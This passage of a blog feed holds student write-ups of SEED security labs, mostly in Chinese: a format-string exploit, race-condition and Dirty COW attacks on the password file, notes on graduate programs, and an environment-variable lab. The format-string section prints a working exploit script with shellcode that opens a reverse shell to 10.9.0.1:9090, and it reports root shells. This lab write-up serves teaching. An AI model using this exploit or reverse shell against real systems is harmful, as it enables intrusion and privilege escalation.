alt="10"></p><p>可以看到地址为<code>0x080e5068</code></p><h4 id="Task-3-A-Change-the-value-to-a-different-value"><a href="#Task-3-A-Change-the-value-to-a-different-value" class="headerlink" title="Task 3.A: Change the value to a different value"></a>Task 3.A: Change the value to a different value</h4><p>修改内存当中数据的一个重要方式是通过%n</p><p>构造payload</p><p><img src="/2021/05/12/Format-String-lab-1/12.PNG" srcset="/img/loading.gif" alt="12"></p><p><img src="/2021/05/12/Format-String-lab-1/11.PNG" srcset="/img/loading.gif" alt="11"></p><p>可以看到对应的target的值已经从原来的0x11223344变成了0x4</p><h4 id="Task-3-B-Change-the-value-to-0x5000"><a href="#Task-3-B-Change-the-value-to-0x5000" class="headerlink" title="Task 3.B: Change the value to 0x5000"></a>Task 3.B: Change the value to 0x5000</h4><p>因为我们现在只是通过%n将对应的位置修改为了0x4，而目标是修改为0x5000，</p><blockquote><p>这里我们需要定向修改，因此必须输出额外的字符作为填充。这里我们插入了%1276x（1276 = 0x4FC = 0x500 - 0x4），程序会把输出的值强制扩展到1276位</p></blockquote><p>构造payload</p><p><img src="/2021/05/12/Format-String-lab-1/114.PNG" srcset="/img/loading.gif" alt="114"></p><p><img src="/2021/05/12/Format-String-lab-1/13.PNG" srcset="/img/loading.gif" alt="13"></p><h4 id="Task-3-C-Change-the-value-to-0xAABBCCDD"><a href="#Task-3-C-Change-the-value-to-0xAABBCCDD" class="headerlink" title="Task 3.C: Change the value to 0xAABBCCDD"></a>Task 3.C: Change the value to 0xAABBCCDD</h4><blockquote><p>当我们需要把内存中的某个值修改为一个非常大的数时，如果直接使用%n写入的话，那么需要提前输出数量巨大的字符，这会消耗非常多的时间，因而，如果我们希望改写一个地址，最好使用%hn，他一次写入两个字节而非四个，此外还有%hhn，一次写入一个字节<br>于是，我们试图向0x080e5068和0x080e506A中分别写入0xCCDD和0xAABB此时问题出现了：当我们需要把内存中的某个值修改为一个非常小的数时，因为我们在前面必须输出一些字符以确定修改的地址，那么看上去，我们所能修改的值看上去是有下界的（比如在这里，看上去我们不能实现小于8的值的写入），但是实际上，我们可以通过溢出来解决这个问题——因为我们只写两个字节，所以0x0000和0x10000的效果是一样的，因此高低地址要填充的字节数可以如下计算：<br>低地址 ： low_adr - 8 if low_adr &gt; 8 else low_adr + 0x10000 - 8 = 65528<br>高地址 ： high_adr - low_adr if high_adr &gt; low_adr else high_adr + 0x10000 - low_adr = 65433</p></blockquote><p>在这里，我们所需要算的是0XCCDD - 8 = 52,437，0xAABB - 0xCCDD = 56,798（注意借位）</p><p>构造payload</p><p><img src="/2021/05/12/Format-String-lab-1/16.PNG" srcset="/img/loading.gif" alt="16"></p><p><img src="/2021/05/12/Format-String-lab-1/15.PNG" srcset="/img/loading.gif" alt="15"></p><h2 id="Task-4-Inject-Malicious-Code-into-the-Server-Program"><a href="#Task-4-Inject-Malicious-Code-into-the-Server-Program" class="headerlink" title="Task 4: Inject Malicious Code into the Server Program"></a>Task 4: Inject Malicious Code into the Server Program</h2><p>Q1：我们可以根据提示信息来获取buffer的起始位置为<code>0xffffd650</code></p><p>我们先来通过gdb来找myprintf中return 的地址</p><p><img src="/2021/05/12/Format-String-lab-1/17.PNG" srcset="/img/loading.gif" alt="17"></p><p>所以return address当中应该放的是0x8049f7e</p><p>之后来找return address的内存位置，根据之前打印的stack上面的情况，可以看到return address所在位置是第11个参数，与buffer起始位置相距212个字节，之后相减，0xffffd650 - 0xd4 = 0xFFFFD57C</p><p>Q2：64个%x</p><p>构造payload</p><p>此时，将shellcode放在距离buffer起始位置0x100处，地址位0xffffd750</p><p>其中，0xFFFFD57C需要存放0xd750，- 8后需要填充55112，而较高位0xFFFFD57E需要存放0xFFFF，需要填充0xFFFF - 0xD750 = 0x28AF =10415</p><pre><code class="hljs c">#!/usr/bin/python3<span class="hljs-keyword">import</span> sys# <span class="hljs-number">32</span>-<span class="hljs-built_in">bit</span> Generic Shellcode shellcode_32 = (   <span class="hljs-string">"\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"</span>   <span class="hljs-string">"\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"</span>   <span class="hljs-string">"\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"</span>   <span class="hljs-string">"/bin/bash*"</span>   <span class="hljs-string">"-c*"</span>   # The * in <span class="hljs-keyword">this</span> <span class="hljs-built_in">line</span> serves as the <span class="hljs-built_in">position</span> marker         *  #<span class="hljs-string">"/bin/ls -l; echo '===== Success! ======'                  *"</span>   <span class="hljs-string">"/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *"</span>   <span class="hljs-string">"AAAA"</span>   # Placeholder <span class="hljs-keyword">for</span> argv[<span class="hljs-number">0</span>] --&gt; <span class="hljs-string">"/bin/bash"</span>   <span class="hljs-string">"BBBB"</span>   # Placeholder <span class="hljs-keyword">for</span> argv[<span class="hljs-number">1</span>] --&gt; <span class="hljs-string">"-c"</span>   <span class="hljs-string">"CCCC"</span>   # Placeholder <span class="hljs-keyword">for</span> argv[<span class="hljs-number">2</span>] --&gt; the command <span class="hljs-built_in">string</span>   <span class="hljs-string">"DDDD"</span>   # Placeholder <span class="hljs-keyword">for</span> argv[<span class="hljs-number">3</span>] --&gt; <span class="hljs-literal">NULL</span>).encode('latin-1')# <span class="hljs-number">64</span>-<span class="hljs-built_in">bit</span> Generic Shellcode shellcode_64 = (   <span class="hljs-string">"\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"</span>   <span class="hljs-string">"\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"</span>   <span class="hljs-string">"\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"</span>   <span class="hljs-string">"\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"</span>   <span class="hljs-string">"/bin/bash*"</span>   <span class="hljs-string">"-c*"</span>   # The * in <span class="hljs-keyword">this</span> <span class="hljs-built_in">line</span> serves as the <span class="hljs-built_in">position</span> marker         *   <span class="hljs-string">"/bin/ls -l; echo '===== Success! ======'                  *"</span>   <span class="hljs-string">"AAAAAAAA"</span>   # Placeholder <span class="hljs-keyword">for</span> argv[<span class="hljs-number">0</span>] --&gt; <span class="hljs-string">"/bin/bash"</span>   <span class="hljs-string">"BBBBBBBB"</span>   # Placeholder <span class="hljs-keyword">for</span> argv[<span class="hljs-number">1</span>] --&gt; <span class="hljs-string">"-c"</span>   <span class="hljs-string">"CCCCCCCC"</span>   # Placeholder <span class="hljs-keyword">for</span> argv[<span class="hljs-number">2</span>] --&gt; the command <span class="hljs-built_in">string</span>   <span class="hljs-string">"DDDDDDDD"</span>   # Placeholder <span class="hljs-keyword">for</span> argv[<span class="hljs-number">3</span>] --&gt; <span class="hljs-literal">NULL</span>).encode('latin-1')N = <span class="hljs-number">1500</span># Fill the content with NOP<span class="hljs-number">'</span>scontent = bytearray(<span class="hljs-number">0x90</span> <span class="hljs-keyword">for</span> i in range(N))# Choose the shellcode version based on your targetshellcode = shellcode_32# Put the shellcode somewhere in the payloadstart = <span class="hljs-number">0x100</span>             # Change <span class="hljs-keyword">this</span> numbercontent[start:start + len(shellcode)] = shellcode##############################################################    Construct the format <span class="hljs-built_in">string</span> here# ############################################################ret_low = <span class="hljs-number">0xFFFFD57C</span>content[0:4]  =  (ret_low).to_bytes(4,byteorder='little')ret_high = <span class="hljs-number">0xFFFFD57E</span>content[4:8]  =  (ret_high).to_bytes(4,byteorder='little')s = <span class="hljs-string">"%55112x%64$hn%10415x%65$hn"</span>fmt  = (s).encode('latin-1')content[<span class="hljs-number">8</span>:<span class="hljs-number">8</span>+len(fmt)] = fmt# Save the format <span class="hljs-built_in">string</span> to filewith open('badfile', 'wb') as f:  f.<span class="hljs-built_in">write</span>(content)</code></pre><p><img src="/2021/05/12/Format-String-lab-1/18.PNG" srcset="/img/loading.gif" alt="18"></p><p>可以看到reverse shell成功</p><h2 id="Task-5-Attacking-the-64-bit-Server-Program"><a href="#Task-5-Attacking-the-64-bit-Server-Program" class="headerlink" title="Task 5: Attacking the 64-bit Server Program"></a>Task 5: Attacking the 64-bit Server Program</h2><p>您的工作是构造有效负载以利用服务器的格式字符串漏洞。您的最终目标是在目标服务器上获得一个根shell。</p><p>首先就是先打印出来栈上面的信息</p><p><img src="/2021/05/12/Format-String-lab-1/19.PNG" srcset="/img/loading.gif" alt="19"></p><p>然后发现buffer起始位置是第34个参数</p><p>然后开始找return address的位置，根据提示信息中的frame pointer来找，frame pointer是0x00007fffffffe4c0，所以return address所在的位置就应该是0x00007fffffffe4c8</p><h4 id="问题-amp-解决"><a href="#问题-amp-解决" class="headerlink" title="问题&amp;解决"></a>问题&amp;解决</h4><p>printf在遇一个字节的0的时候会停止解析，<strong>解决方法就是将对应的地址放在buffer的比较高的地方</strong></p><p>要修改位于<code>0x00007fffffffe4c8</code>的return address的值，仍然将shellcode放在距离buffer0x100的地方，所以此时shellcode的起始位置是<code>0x00007fffffffe680</code></p><p>所以0x00007fffffffe4c8的低两位需要放0xe680，0x00007fffffffe4cA的中两位需要放0xffff，0x00007fffffffe4cc的高两位放0x7fff，最高位放0x0000</p><p>按照这个来修改对应文件，在这里没有贴上来，搞清思路了就基本没有什么难点。关于printf具体实现，可参考：<a href="https://blog.csdn.net/zhengqijun_/article/details/72454714" target="_blank" rel="noopener">printf 函数实现的深入剖析</a></p><p>然后运行结果如下：</p><p><img src="/2021/05/12/Format-String-lab-1/20.PNG" srcset="/img/loading.gif" alt="20"></p><p>可以看到reverse shell成功</p><h2 id="Task-6"><a href="#Task-6" class="headerlink" title="Task 6"></a>Task 6</h2><p>warning信息</p><pre><code class="hljs livecodeserver"><span class="hljs-built_in">format</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">a</span> <span class="hljs-keyword">string</span> literal <span class="hljs-keyword">and</span> no <span class="hljs-built_in">format</span> arguments</code></pre><p>是在说不是在格式化参数，解决方案，改为printf（“%s”,msg）即可，此时没有warning</p><p><img src="/2021/05/12/Format-String-lab-1/21.PNG" srcset="/img/loading.gif" alt="21"></p><p><img src="/2021/05/12/Format-String-lab-1/22.PNG" srcset="/img/loading.gif" alt="22"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Format-String&quot;&gt;&lt;a href=&quot;#Format-String&quot; class=&quot;headerlink&quot; title=&quot;Format String&quot;&gt;&lt;/a&gt;Format String&lt;/h1&gt;&lt;h2 id=&quot;overview&quot;&gt;&lt;a href=&quot;#o</summary>
      
    
    
    
    
    <category term="Software security" scheme="http://yoursite.com/tags/Software-security/"/>
    
  </entry>
  
  <entry>
    <title>The information of School</title>
    <link href="http://yoursite.com/2021/05/07/The-information-of-School/"/>
    <id>http://yoursite.com/2021/05/07/The-information-of-School/</id>
    <published>2021-05-07T13:50:42.000Z</published>
    <updated>2021-05-08T12:46:06.089Z</updated>
    
    <content type="html"><![CDATA[<h2 id="USC（南加州大学）"><a href="#USC（南加州大学）" class="headerlink" title="USC（南加州大学）"></a>USC（南加州大学）</h2><h3 id="综述："><a href="#综述：" class="headerlink" title="综述："></a>综述：</h3><p><strong>针对南加州大学来说，缺少的信息在于没有具体的GPA以及TOEFL、GRE要求，但是能够找到相应的课程</strong></p><p>还有就是很多项目在第一轮筛选的时候就不是target，所以就没有将信息放上去</p><p>每个项目后面的*的数量代表优先程度</p><ul><li><p><a href="https://www.cs.usc.edu/academic-programs/masters/" target="_blank" rel="noopener">项目链接</a></p><ul><li><p><a href="https://www.cs.usc.edu/academic-programs/masters/computer-science-general/" target="_blank" rel="noopener">M.S. Computer Science (General)</a>    （*根据课程来看不是很感兴趣）</p><ul><li><p><a href="https://www.cs.usc.edu/academic-programs/masters/artificial-intelligence/" target="_blank" rel="noopener">AI</a>（4 * 感兴趣，属于第一档）</p><p><img src="/2021/05/07/The-information-of-School/1.PNG" srcset="/img/loading.gif" alt="1"></p></li></ul></li><li><p><a href="https://www.cs.usc.edu/academic-programs/masters/intelligent-robotics/" target="_blank" rel="noopener">Intelligent Robotics</a>（2 * 半）</p><p>  <img src="/2021/05/07/The-information-of-School/2.PNG" srcset="/img/loading.gif" alt="2"></p></li></ul></li></ul><h2 id="uchicago（芝加哥大学）"><a href="#uchicago（芝加哥大学）" class="headerlink" title="uchicago（芝加哥大学）"></a>uchicago（芝加哥大学）</h2><h3 id="综述：-1"><a href="#综述：-1" class="headerlink" title="综述："></a>综述：</h3><p><strong>信息浏览过之后发现就俩项目，而且MPCS（master program of computer science）和CAPP，看完课程信息之后感觉都不是特别合适</strong></p><h2 id="uci（加州大学欧文分校）"><a href="#uci（加州大学欧文分校）" class="headerlink" title="uci（加州大学欧文分校）"></a>uci（加州大学欧文分校）</h2><h3 id="综述：-2"><a href="#综述：-2" class="headerlink" title="综述："></a>综述：</h3><p><strong>Computer Science方面的项目比较少</strong></p><ul><li><p><a href="http://catalogue.uci.edu/donaldbrenschoolofinformationandcomputersciences/departmentofcomputerscience/computerscience_ms/#text" target="_blank" rel="noopener">Computer Science, M.S</a>.（2 *半）</p><p>  <img src="/2021/05/07/The-information-of-School/3.PNG" srcset="/img/loading.gif" alt="3"></p></li><li><p><a href="http://catalogue.uci.edu/donaldbrenschoolofinformationandcomputersciences/departmentofcomputerscience/computerscience_master/#requirementstext" target="_blank" rel="noopener">Master of Computer Science</a>（勉强3 *）</p></li></ul><p><img src="/2021/05/07/The-information-of-School/4.PNG" srcset="/img/loading.gif" alt="4"></p><p><img src="/2021/05/07/The-information-of-School/5.PNG" srcset="/img/loading.gif" alt="5"></p><h2 id="Northwestern-University（西北大学）待补充"><a href="#Northwestern-University（西北大学）待补充" class="headerlink" title="Northwestern University（西北大学）待补充"></a>Northwestern University（西北大学）待补充</h2><h3 id="综述：-3"><a href="#综述：-3" class="headerlink" title="综述："></a>综述：</h3><ul><li>Master of Science in Computer Science (MS)</li></ul><h2 id="Duke（杜克大学）"><a href="#Duke（杜克大学）" class="headerlink" title="Duke（杜克大学）"></a>Duke（杜克大学）</h2><h3 id="综述：-4"><a href="#综述：-4" class="headerlink" title="综述："></a>综述：</h3><p><strong>MS in Computer Science和MS in Economics and Computation，只有两个项目，并且第一个项目没有具体的信息，</strong></p><p><strong>暂时对杜克无感，觉得也申不上。。。</strong></p><h2 id="brown（布朗大学）需帮助补充"><a href="#brown（布朗大学）需帮助补充" class="headerlink" title="brown（布朗大学）需帮助补充"></a>brown（布朗大学）需帮助补充</h2><h3 id="综述：-5"><a href="#综述：-5" class="headerlink" title="综述："></a>综述：</h3><p><strong>项目较少并且没有找到相关的课程设置，同时未找到录取相关推荐信要求以及GPA</strong></p><ul><li>the <a href="https://cs.brown.edu/degrees/masters" target="_blank" rel="noopener">Master of Science in Computer Science</a></li></ul><h2 id="RICE（莱斯大学）"><a href="#RICE（莱斯大学）" class="headerlink" title="RICE（莱斯大学）"></a>RICE（莱斯大学）</h2><h3 id="综述：-6"><a href="#综述：-6" class="headerlink" title="综述："></a>综述：</h3><p><strong>program太少，而且要么是面向就业，要么是profession，专业硕士</strong></p><ul><li>录取要求：<strong>至少三封推荐信，托福最少90</strong></li><li><a href="https://csweb.rice.edu/academics/graduate-programs/professional-masters-programs" target="_blank" rel="noopener">Master of Computer Science Program</a>（面向就业的，先给2 *）</li></ul><h2 id="Yale（耶鲁大学）"><a href="#Yale（耶鲁大学）" class="headerlink" title="Yale（耶鲁大学）"></a>Yale（耶鲁大学）</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;USC（南加州大学）&quot;&gt;&lt;a href=&quot;#USC（南加州大学）&quot; class=&quot;headerlink&quot; title=&quot;USC（南加州大学）&quot;&gt;&lt;/a&gt;USC（南加州大学）&lt;/h2&gt;&lt;h3 id=&quot;综述：&quot;&gt;&lt;a href=&quot;#综述：&quot; class=&quot;header</summary>
      
    
    
    
    
    <category term="School Information" scheme="http://yoursite.com/tags/School-Information/"/>
    
  </entry>
  
  <entry>
    <title>Race Condition</title>
    <link href="http://yoursite.com/2021/04/21/Race-Condition/"/>
    <id>http://yoursite.com/2021/04/21/Race-Condition/</id>
    <published>2021-04-21T06:14:21.000Z</published>
    <updated>2021-04-29T07:51:16.711Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><blockquote><p> A race condition occurs when multiple processes access and manipulate the same data concurrently, and the outcome of the execution depends on the particular order in which the access takes place. If a privileged program has a race-condition vulnerability, attackers can run a parallel process to “race” against the privileged program, with an intention to change the behaviors of the program.</p></blockquote><h2 id="Environment-Setup"><a href="#Environment-Setup" class="headerlink" title="Environment Setup"></a>Environment Setup</h2><p><img src="/2021/04/21/Race-Condition/1.PNG" srcset="/img/loading.gif" alt="1"></p><h2 id="Tasks"><a href="#Tasks" class="headerlink" title="Tasks"></a>Tasks</h2><h3 id="task-1"><a href="#task-1" class="headerlink" title="task 1"></a>task 1</h3><p><img src="/2021/04/21/Race-Condition/2.PNG" srcset="/img/loading.gif" alt="2"></p><h3 id="task-2"><a href="#task-2" class="headerlink" title="task 2"></a>task 2</h3><blockquote><p>The ultimate goal is to gain the root privilege. The most critical step of the attack, making /tmp/XYZ point to the password file, must occur within the window between check and use; namely between the access and fopen calls in the vulnerable program.</p></blockquote><h4 id="Task-2-A-Simulating-a-Slow-Machine"><a href="#Task-2-A-Simulating-a-Slow-Machine" class="headerlink" title="Task 2.A: Simulating a Slow Machine"></a>Task 2.A: Simulating a Slow Machine</h4><p>最开始的时候需要将/tmp/XYZ连接到/dev/null，这样才会保证能够进入到access函数当中</p><p><img src="/2021/04/21/Race-Condition/3.PNG" srcset="/img/loading.gif" alt="3"></p><p>然后此时可以进行写入，但是需要在休眠10s的时候修改符号链接</p><p><img src="/2021/04/21/Race-Condition/4.PNG" srcset="/img/loading.gif" alt="4"></p><p><img src="/2021/04/21/Race-Condition/5.PNG" srcset="/img/loading.gif" alt="5"></p><p><img src="/2021/04/21/Race-Condition/6.PNG" srcset="/img/loading.gif" alt="6"></p><p>可以看到对应的字符串已经添加到了目标文件当中</p><h4 id="Task-2-B-The-Real-Attack"><a href="#Task-2-B-The-Real-Attack" class="headerlink" title="Task 2.B: The Real Attack"></a>Task 2.B: The Real Attack</h4><blockquote><p>The typical strategy in race condition attacks is to run the attack program in parallel to the target program, hoping to be able to do the critical step within that time window. </p></blockquote><p>the malicious.c code</p><p><img src="/2021/04/21/Race-Condition/8.PNG" srcset="/img/loading.gif" alt="8"></p><p>and the what we need to do is modifying the .sh and run it parallelly</p><p><img src="/2021/04/21/Race-Condition/9.PNG" srcset="/img/loading.gif" alt="9"></p><p><img src="/2021/04/21/Race-Condition/7.PNG" srcset="/img/loading.gif" alt="7"></p><p>we can find that the passwd has already been changed</p><h4 id="Task-2-C-An-Improved-Attack-Method"><a href="#Task-2-C-An-Improved-Attack-Method" class="headerlink" title="Task 2.C: An Improved Attack Method"></a>Task 2.C: An Improved Attack Method</h4><blockquote><p>如果XYZ变成root的，攻击将不会成功，因为使用seed权限运行的攻击程序将无法再取消链接。这是因为/tmp文件夹上有一个“sticky”位，这意味着只有文件的所有者才能删除该文件，即使该文件夹是可写的。</p><p>出现这种情况的主要原因是，攻击程序在unlink之后，symlink之前，上下文就被关闭了。因为这两个操作不是原子的，所以如果上下文切换发生在两者之间，目标Set UID程序有机会运行open函数，它将创建一个以root为所有者的新文件。之后，攻击程序将无法再对/tmp/XYZ进行更改。</p></blockquote><p>为解决上述问题，将两个操作变为原子的，具体如下。不断改变XYZ链接的文件，实现攻击的条件。</p><p><img src="/2021/04/21/Race-Condition/11.PNG" srcset="/img/loading.gif" alt="11"></p><p><img src="/2021/04/21/Race-Condition/10.PNG" srcset="/img/loading.gif" alt="10"></p><p><img src="/2021/04/21/Race-Condition/12.PNG" srcset="/img/loading.gif" alt="12"></p><h3 id="Task-3-Countermeasures"><a href="#Task-3-Countermeasures" class="headerlink" title="Task 3: Countermeasures"></a>Task 3: Countermeasures</h3><h4 id="Task-3-A-Applying-the-Principle-of-Least-Privilege"><a href="#Task-3-A-Applying-the-Principle-of-Least-Privilege" class="headerlink" title="Task 3.A: Applying the Principle of Least Privilege"></a>Task 3.A: Applying the Principle of Least Privilege</h4><p><img src="/2021/04/21/Race-Condition/14.PNG" srcset="/img/loading.gif" alt="14"></p><p><img src="/2021/04/21/Race-Condition/13.PNG" srcset="/img/loading.gif" alt="13"></p><p>no permission occur when it cannot open the file. And when it links to /dev/null, it can pass the accsee(), but there is no root privilege to modify the file</p><h4 id="Task-3-B-Using-Ubuntu’s-Built-in-Scheme"><a href="#Task-3-B-Using-Ubuntu’s-Built-in-Scheme" class="headerlink" title="Task 3.B: Using Ubuntu’s Built-in Scheme"></a>Task 3.B: Using Ubuntu’s Built-in Scheme</h4><p><img src="/2021/04/21/Race-Condition/15.PNG" srcset="/img/loading.gif" alt="15"></p><p>打开内置保护后，攻击也会失败。当保护机制打开时，满足以下条件之一才允许跟随符号链接：</p><ul><li><p>符号链接所在文件夹不是“黏性”的</p></li><li><p>符号链接的uid和follower匹配</p></li><li><p>符号链接的所有者和文件夹的所有者匹配</p></li></ul><h1 id="Dirty-Cow"><a href="#Dirty-Cow" class="headerlink" title="Dirty Cow"></a>Dirty Cow</h1><p><img src="/2021/04/21/Race-Condition/16.PNG" srcset="/img/loading.gif" alt="16"></p><h3 id="Task-2-Modify-the-Password-File-to-Gain-the-Root-Privilege"><a href="#Task-2-Modify-the-Password-File-to-Gain-the-Root-Privilege" class="headerlink" title="Task 2: Modify the Password File to Gain the Root Privilege"></a>Task 2: Modify the Password File to Gain the Root Privilege</h3><p><img src="/2021/04/21/Race-Condition/17.PNG" srcset="/img/loading.gif" alt="17"></p><p><img src="/2021/04/21/Race-Condition/18.PNG" srcset="/img/loading.gif" alt="18"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Overview&quot;&gt;&lt;a href=&quot;#Overview&quot; class=&quot;headerlink&quot; title=&quot;Overview&quot;&gt;&lt;/a&gt;Overview&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt; A race condition occurs when mul</summary>
      
    
    
    
    
    <category term="software security" scheme="http://yoursite.com/tags/software-security/"/>
    
  </entry>
  
  <entry>
    <title>environment variable and set-uid program</title>
    <link href="http://yoursite.com/2021/04/11/environment-variable-and-set-uid-program/"/>
    <id>http://yoursite.com/2021/04/11/environment-variable-and-set-uid-program/</id>
    <published>2021-04-11T12:30:49.000Z</published>
    <updated>2021-04-15T05:39:28.428Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Lab-Tasks"><a href="#Lab-Tasks" class="headerlink" title="Lab Tasks"></a>Lab Tasks</h2><h3 id="task-1：manipulate-environment-variable"><a href="#task-1：manipulate-environment-variable" class="headerlink" title="task 1：manipulate environment variable"></a>task 1：manipulate environment variable</h3><ul><li>打印环境变量</li></ul><p><img src="/2021/04/11/environment-variable-and-set-uid-program/1.PNG" srcset="/img/loading.gif" alt="1"></p><ul><li>使用export和unset来设置和取消设置环境变量</li></ul><blockquote><p>这两条命令不是单独的程序，是bash的内部命令，而shell默认的程序是/bin/bash</p></blockquote><p><img src="/2021/04/11/environment-variable-and-set-uid-program/2.PNG" srcset="/img/loading.gif" alt="2"></p><h3 id="task2：Passing-environment-variable"><a href="#task2：Passing-environment-variable" class="headerlink" title="task2：Passing environment variable"></a>task2：Passing environment variable</h3><h4 id="step-1"><a href="#step-1" class="headerlink" title="step 1"></a>step 1</h4><p>对program进行编译，这个program会使得它的子进程打印出来字符指针数组的信息</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/3.PNG" srcset="/img/loading.gif" alt="3"></p><p>可以看到，相应的环境变量的信息是被打印出来了，之后将这些信息存储在文件当中</p><h4 id="step-2"><a href="#step-2" class="headerlink" title="step 2"></a>step 2</h4><p>修改之后重新进行编译运行</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/4.PNG" srcset="/img/loading.gif" alt="4"></p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/5.PNG" srcset="/img/loading.gif" alt="5"></p><p>然后存储在file1文件当中</p><h4 id="step-3"><a href="#step-3" class="headerlink" title="step 3"></a>step 3</h4><p>之后通过<code>diff file file1</code>来进行对比，会看到除了第48行中可执行文件的名字不同之外，environment variable并没有区别</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/6.PNG" srcset="/img/loading.gif" alt="6"></p><p>总结，通过fork()产生的子进程拥有和父进程完全一致的环境变量</p><h3 id="task-3：Environment-Variables-and-execve"><a href="#task-3：Environment-Variables-and-execve" class="headerlink" title="task 3：Environment Variables and execve()"></a>task 3：Environment Variables and execve()</h3><h4 id="step-1-1"><a href="#step-1-1" class="headerlink" title="step 1"></a>step 1</h4><p>在这个task当中，我们所要研究的是exevce()函数以及在调用前后environment variable的变化</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/7.PNG" srcset="/img/loading.gif" alt="7"></p><p>此时，不打印任何东西，分析原因，会发现是由于在execve当中传递的第三个指针数组为空，所以此时没有环境变量可打印</p><h4 id="step-2-1"><a href="#step-2-1" class="headerlink" title="step 2"></a>step 2</h4><p>修改指针数组内容为全局环境变量，可以看到相应的变量信息被打印出来</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/8.PNG" srcset="/img/loading.gif" alt="8"></p><h4 id="step-3-1"><a href="#step-3-1" class="headerlink" title="step 3"></a>step 3</h4><p>再次修改传递的指针数组的内容，之后编译运行</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/9.PNG" srcset="/img/loading.gif" alt="9"></p><p>可以看到，新的环境变量就是我们所设置的指针数组里面的内容</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/10.PNG" srcset="/img/loading.gif" alt="10"></p><p>总结：通过execve()运行的新的进程是通过指针数组，以传参的形式获取environment variable的</p><h3 id="task-4：Environment-Variables-and-system"><a href="#task-4：Environment-Variables-and-system" class="headerlink" title="task 4：Environment Variables and system()"></a>task 4：Environment Variables and system()</h3><p>逻辑是这样的，system()和execve()类似，调用一个新的程序，只不过system()已经设置好了所需要调用的文件/bin/sh，而system()回调用execl()函数，而execl()则会调用execve()函数</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/12.PNG" srcset="/img/loading.gif" alt="12"></p><p>而如果直接运行该命令，可以看到输出的内容是一样的</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/13.PNG" srcset="/img/loading.gif" alt="13"></p><p>总结：当我们运行system()函数的时候，抛开外表，也是通过传递指针数组的形式来传递环境变量的</p><h3 id="Task-5-Environment-Variable-and-Set-UID-Programs"><a href="#Task-5-Environment-Variable-and-Set-UID-Programs" class="headerlink" title="Task 5: Environment Variable and Set-UID Programs"></a>Task 5: Environment Variable and Set-UID Programs</h3><p>在这个task当中，我们aim at <code>set-uid</code>程序是否会继承来自用户程序的environment variable，关于set-uid程序，参考<a href="https://www.cnblogs.com/bwangel23/p/4225818.html" target="_blank" rel="noopener">setuid函数解析</a></p><h4 id="step-1-2"><a href="#step-1-2" class="headerlink" title="step 1"></a>step 1</h4><p><img src="/2021/04/11/environment-variable-and-set-uid-program/14.PNG" srcset="/img/loading.gif" alt="14"></p><h4 id="step-2-2"><a href="#step-2-2" class="headerlink" title="step 2"></a>step 2</h4><p>之后需要让这个program具有root权限以及使它成为一个<code>Set-UID</code>程序</p><blockquote><p>chmod 4755与chmod 755对比多了附加权限值4，这个4表示其他用户执行文件时，具有与所有者同样的权限（设置了SUID）。</p><p>为什么要设置4755 而不是 755？<br>假设netlogin是root用户创建的一个上网认证程序，如果其他用户要上网也要用到这个程序，那就需要root用户运行chmod 755 netlogin命令使其他用户也能运行netlogin。但假如netlogin执行时需要访问一些只有root用户才有权访问的文件，那么其他用户执行netlogin时可能因为权限不够还是不能上网。这种情况下，就可以用 chmod 4755 netlogin 设置其他用户在执行netlogin也有root用户的权限，从而顺利上网。</p></blockquote><p><img src="/2021/04/11/environment-variable-and-set-uid-program/15.PNG" srcset="/img/loading.gif" alt="15"></p><h4 id="step-3-2"><a href="#step-3-2" class="headerlink" title="step 3"></a>step 3</h4><p>把对应的environment variable在用户环境下设置好</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/16.PNG" srcset="/img/loading.gif" alt="16"></p><p>之后运行，可以看到我们设置的environment variable中的MYSHELL是被打印出来了，说明该环境变量是从shell 程序当中继承过来的</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/17.png" srcset="/img/loading.gif" alt="17"></p><p>修改一下code，然后依旧给他root的权限以及set-uid的权限</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/19.PNG" srcset="/img/loading.gif" alt="19"></p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/18.PNG" srcset="/img/loading.gif" alt="18"></p><p>可以看到，我们能找到PATH以及自己定义的环境变量，无法找到第二个环境变量LD LIBRARY PATH</p><h4 id="为什么LD-LIBRARY-PATH环境变量不会被包含到子进程的环境变量中呢"><a href="#为什么LD-LIBRARY-PATH环境变量不会被包含到子进程的环境变量中呢" class="headerlink" title="为什么LD_LIBRARY_PATH环境变量不会被包含到子进程的环境变量中呢?"></a>为什么LD_LIBRARY_PATH环境变量不会被包含到子进程的环境变量中呢?</h4><p>参考blog：<a 